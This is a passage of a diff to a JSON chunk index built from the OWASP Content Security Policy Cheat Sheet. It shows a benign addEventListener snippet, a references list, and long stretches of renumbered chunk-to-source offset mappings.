+        "Refactoring inline code"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00101",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 101,
+      "chunk_type": "code",
+      "text_content": "```javascript\ndocument.getElementById(\"button1\").addEventListener('click', doSomething);\n```",
+      "token_count": 25,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "Content Security Policy Cheat Sheet",
+        "CSP Sample Policies",
+        "Refactoring inline code"
+      ]
+    },
+    {
+      "chunk_id": "ver_4d5e2f4d1c42_c00102",
+      "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+      "version_id": "ver_4d5e2f4d1c42",
+      "chunk_idx": 102,
       "chunk_type": "heading",
       "text_content": "## References",
       "token_count": 3,
@@ -1116,10 +1557,10 @@
       ]
     },
     {
-      "chunk_id": "ver_4d5e2f4d1c42_c00074",
+      "chunk_id": "ver_4d5e2f4d1c42_c00103",
       "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
       "version_id": "ver_4d5e2f4d1c42",
-      "chunk_idx": 74,
+      "chunk_idx": 103,
       "chunk_type": "list",
       "text_content": "- [W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)\n- [MDN Content-Security-Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)\n- [Strict CSP deployment guidance](https://web.dev/articles/strict-csp)",
       "token_count": 88,
@@ -1212,1504 +1653,1456 @@
       "end_offset": 76
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00008_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00008",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00009_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00009",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00009",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 62
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00008_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00008",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00010_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00010",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00010",
-      "source_order": 2,
+      "source_order": 0,
       "start_offset": 1,
       "end_offset": 15
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00009_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00009",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00011_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00011",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00011",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 34
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00010_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00010",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00012_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00012",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00012",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 90
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00010_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00010",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00013_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00013",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00013",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 62
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00010_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00010",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00014_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00014",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00014",
-      "source_order": 2,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 14
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00011_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00011",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00015_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00015",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00015",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 37
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00012_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00012",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00016_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00016",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00016",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 140
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00012_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00012",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00017_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00017",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00017",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 170
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00013_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00013",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00018_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00018",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00018",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 36
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00014_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00014",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00019_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00019",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00019",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 114
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00014_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00014",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00020_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00020",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00020",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 83
-    },
-    {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00014_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00014",
-      "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00020",
-      "source_order": 2,
-      "start_offset": 84,
-      "end_offset": 169
-    },
-    {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00014_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00014",
-      "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00020",
-      "source_order": 3,
-      "start_offset": 171,
-      "end_offset": 231
-    },
-    {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00014_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00014",
-      "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00020",
-      "source_order": 4,
-      "start_offset": 233,
       "end_offset": 281
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00015_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00015",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00021_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00021",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00021",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 27
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00016_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00016",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00022_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00022",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00022",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 218
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00017_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00017",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00023_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00023",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00023",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 35
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00018_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00018",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00024",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00024",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 153
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00018_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00018",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00024",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00025",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 131
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00019_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00019",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00025_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00025",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00026",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 20
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00020_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00020",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00026",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00027",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 123
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00020_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00020",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00026",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00027",
       "source_order": 1,
       "start_offset": 124,
       "end_offset": 295
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00020_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00020",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00026",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00028",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 217
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00020_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00020",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00026",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00028",
       "source_order": 3,
       "start_offset": 218,
       "end_offset": 388
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00020_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00020",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00026",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00029",
       "source_order": 4,
       "start_offset": 0,
       "end_offset": 104
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00020_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00020",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s005",
+      "chunk_id": "ver_4d5e2f4d1c42_c00026",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00029",
       "source_order": 5,
       "start_offset": 105,
       "end_offset": 340
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00021_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00021",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00027_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00027",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00030",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 18
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00022_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00022",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00028_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00028",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00031",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 72
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00023_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00023",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00029_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00029",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00032",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 37
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00030_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00030",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00033",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 73
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00031_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00031",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00034",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 36
-    },
-    {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
-      "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00034",
-      "source_order": 2,
-      "start_offset": 37,
       "end_offset": 40
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00032_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00032",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00035",
-      "source_order": 3,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 74
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00032_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00032",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00035",
-      "source_order": 4,
+      "source_order": 1,
       "start_offset": 75,
       "end_offset": 130
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00032_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00032",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00036",
-      "source_order": 5,
+      "source_order": 2,
       "start_offset": 0,
       "end_offset": 35
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00024_s006",
-      "chunk_id": "ver_4d5e2f4d1c42_c00024",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00032_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00032",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00036",
-      "source_order": 6,
+      "source_order": 3,
       "start_offset": 36,
       "end_offset": 86
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00025_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00025",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00033_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00033",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00037",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 49
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00034_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00034",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00038",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 97
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00035_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00035",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00039",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 48
-    },
-    {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
-      "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00039",
-      "source_order": 2,
-      "start_offset": 49,
       "end_offset": 52
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00036",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00040",
-      "source_order": 3,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 146
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00036",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00041",
-      "source_order": 4,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 40
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s005",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00036",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00041",
-      "source_order": 5,
+      "source_order": 2,
       "start_offset": 41,
       "end_offset": 238
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s006",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00036",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00041",
-      "source_order": 6,
+      "source_order": 3,
       "start_offset": 239,
       "end_offset": 322
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s007",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00036",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00042",
-      "source_order": 7,
+      "source_order": 4,
       "start_offset": 0,
       "end_offset": 154
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00026_s008",
-      "chunk_id": "ver_4d5e2f4d1c42_c00026",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s005",
+      "chunk_id": "ver_4d5e2f4d1c42_c00036",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00042",
-      "source_order": 8,
+      "source_order": 5,
       "start_offset": 155,
       "end_offset": 350
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00027_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00027",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00037_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00037",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00043",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 39
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00028_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00028",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00038_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00038",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00044",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 155
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00028_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00028",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00038_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00038",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00045",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 102
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00028_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00028",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00039_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00039",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00046",
-      "source_order": 2,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 69
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00028_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00028",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00040",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00047",
-      "source_order": 3,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 66
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00028_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00028",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00040_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00040",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00047",
-      "source_order": 4,
+      "source_order": 1,
       "start_offset": 67,
       "end_offset": 462
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00029_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00029",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00041_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00041",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00048",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 11
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00030_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00030",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00042_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00042",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00049",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 61
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00030_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00030",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00042_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00042",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00049",
       "source_order": 1,
       "start_offset": 62,
       "end_offset": 172
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00031_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00031",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00043_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00043",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00050",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 49
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00032_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00032",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00044_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00044",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00051",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 212
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00032_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00032",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00044_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00044",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00052",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 167
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00032_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00032",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00044_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00044",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00053",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 145
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00033_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00033",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00045_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00045",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00054",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 13
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00034_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00034",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00046_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00046",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00055",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 154
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00034_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00034",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00046_s001",
+      "chunk_id": "ver_4d5e2f4d1c42_c00046",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00056",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 26
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00034_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00034",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00046_s002",
+      "chunk_id": "ver_4d5e2f4d1c42_c00046",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00057",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 103
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00034_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00034",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00046_s003",
+      "chunk_id": "ver_4d5e2f4d1c42_c00046",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00058",
       "source_order": 3,
       "start_offset": 0,
       "end_offset": 193
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00034_s004",
-      "chunk_id": "ver_4d5e2f4d1c42_c00034",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00046_s004",
+      "chunk_id": "ver_4d5e2f4d1c42_c00046",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00059",
       "source_order": 4,
       "start_offset": 0,
       "end_offset": 114
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00035_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00035",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00047_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00047",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00060",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 15
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s000",
-      "chunk_id": "ver_4d5e2f4d1c42_c00036",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00048_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00048",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00061",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 142
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s001",
-      "chunk_id": "ver_4d5e2f4d1c42_c00036",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00049_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00049",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00062",
-      "source_order": 1,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 68
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s002",
-      "chunk_id": "ver_4d5e2f4d1c42_c00036",
+      "chunk_source_id": "ver_4d5e2f4d1c42_c00050_s000",
+      "chunk_id": "ver_4d5e2f4d1c42_c00050",
       "normalized_block_id": "nrm_ver_4d5e2f4d1c42_b00063",
-      "source_order": 2,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 139
     },
     {
-      "chunk_source_id": "ver_4d5e2f4d1c42_c00036_s003",
-      "chunk_id": "ver_4d5e2f4d1c42_c00036",
